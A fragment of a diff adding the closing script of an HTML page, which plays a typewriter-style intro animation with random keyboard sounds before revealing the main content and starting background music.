+                document.getElementById('keyboard-sound-1'),
+                document.getElementById('keyboard-sound-2'),
+                document.getElementById('keyboard-sound-3')
+            ];
+            const backgroundMusic = document.getElementById('background-music');
+            
+            typingContainer.style.display = 'block';
+            let currentTextIndex = 0;
+            
+            function showNextLine() {
+                if (currentTextIndex >= texts.length) {
+                    setTimeout(() => {
+                        typingContainer.style.display = 'none';
+                        mainContent.style.display = 'block';
+                        setTimeout(() => {
+                            mainContent.classList.add('show');
+                            backgroundMusic.play().catch(() => {});
+                        }, 100);
+                    }, 1000);
+                    return;
+                }
+                
+                const currentText = texts[currentTextIndex];
+                currentText.classList.add('visible');
+                
+                const textContent = currentText.textContent;
+                currentText.textContent = '';
+                let charIndex = 0;
+                
+                function typeChar() {
+                    if (charIndex < textContent.length) {
+                        const sound = keyboardSounds[Math.floor(Math.random() * keyboardSounds.length)];
+                        sound.currentTime = 0;
+                        sound.volume = 0.3;
+                        sound.play().catch(() => {});
+                        
+                        currentText.innerHTML += textContent[charIndex];
+                        charIndex++;
+                        setTimeout(typeChar, Math.random() * 50 + 30);
+                    } else {
+                        currentText.innerHTML = textContent + '<span class="cursor"></span>';
+                        currentTextIndex++;
+                        setTimeout(showNextLine, 500);
+                    }
+                }
+                
+                typeChar();
+            }
+            
+            showNextLine();
+        }
+
+        // Start everything when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            typeText();
+            getUserInfo();
+        });
+    </script>
+</body>
+</html>
